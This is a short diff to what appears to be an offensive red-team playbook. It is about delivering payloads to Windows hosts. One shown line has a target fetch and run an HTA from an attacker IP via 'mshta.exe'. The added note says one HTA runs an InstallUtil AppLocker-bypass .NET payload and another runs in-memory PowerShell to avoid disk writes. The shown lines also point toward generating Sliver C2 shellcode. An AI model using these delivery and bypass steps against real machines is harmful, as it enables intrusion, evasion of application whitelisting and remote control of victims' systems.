@@ -69,6 +69,12 @@ Read the path in your HTTP logs:
 
 Deliver: `mshta.exe http://<IP>/red.hta`
 
+> **Payload type matters:** `black.hta` runs `installutil.exe /U` on a decoded `shell.exe`,
+> which must be a **.NET InstallUtil payload** (compile
+> `word-macro/installutil-applocker-bypass/installutil.cs`) — **not** a raw Sliver/Go implant,
+> because InstallUtil only executes .NET assemblies. `red.hta` runs an in-memory PowerShell
+> `payload.ps1` (no disk write).
+
 ---
 
 ## 2. Generate shellcode (Sliver)
